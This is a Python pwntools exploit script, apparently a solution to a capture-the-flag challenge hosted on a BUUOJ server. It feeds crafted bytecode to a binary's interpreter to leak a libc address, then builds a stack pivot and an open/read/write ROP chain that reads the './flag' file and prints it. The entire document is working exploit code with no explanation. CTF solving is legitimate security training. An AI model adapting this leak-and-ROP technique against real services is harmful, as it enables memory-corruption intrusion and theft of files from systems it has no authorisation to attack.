from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('hh')
io = remote('node4.buuoj.cn', 27255)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc.so.6')
elf = ELF('hh')


code = b''
code += p32(11) + p32(492 + 1000) + p32(11) + p32(493 + 1000)
code += p32(14) * 2
code += p32(16)

io.sendlineafter('Give me you choice :\n', '1')
io.sendlineafter('code:', code)
io.sendlineafter('Give me you choice :\n', '2')
high = int(io.recvline()[:-1], 16)
low = int(io.recvline()[:-1], 16)
libc_base = (high << 32) + low - libc.sym['_IO_2_1_stdin_']
log.success('libc_base: ' + hex(libc_base))
open = libc_base + libc.sym['open']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
pop_rdi_ret = 0x00000000004011a3
pop_rsi_ret = libc_base + 0x00000000000202f8
pop_rdx_ret = libc_base + 0x0000000000001b92
leave_ret = 0x00000000004009cb
filename_addr = 0x602060 + 0x100
ROPchain_addr = filename_addr + 0x10
flag_addr = ROPchain_addr + 0x100
ROPchain  = b'./flag'.ljust(0x10, b'\x00')
ROPchain += p64(pop_rdi_ret) + p64(filename_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open)
ROPchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(0x40) + p64(read)
ROPchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(0x40) + p64(write)

code = p32(9) + p32(ROPchain_addr - 8) + p32(9) + p32(0)        # prepare rbp
code += p32(9) + p32(leave_ret) + p32(9) + p32(0)               # prepare stack pivot
code += p32(12) + p32(1008) + p32(12) + p32(1007)               # rewrite rbp  
code += p32(12) + p32(1006) + p32(12) + p32(1005)               # rewrite return addr
code += p32(16)
code  = code.ljust(0x100, b'\x00')
code += ROPchain

io.sendlineafter('Give me you choice :\n', '1')
io.sendlineafter('code:', code)
# gdb.attach(io)
io.sendlineafter('Give me you choice :\n', '2')
# pause()
flag = io.recv()
log.success(flag.decode())
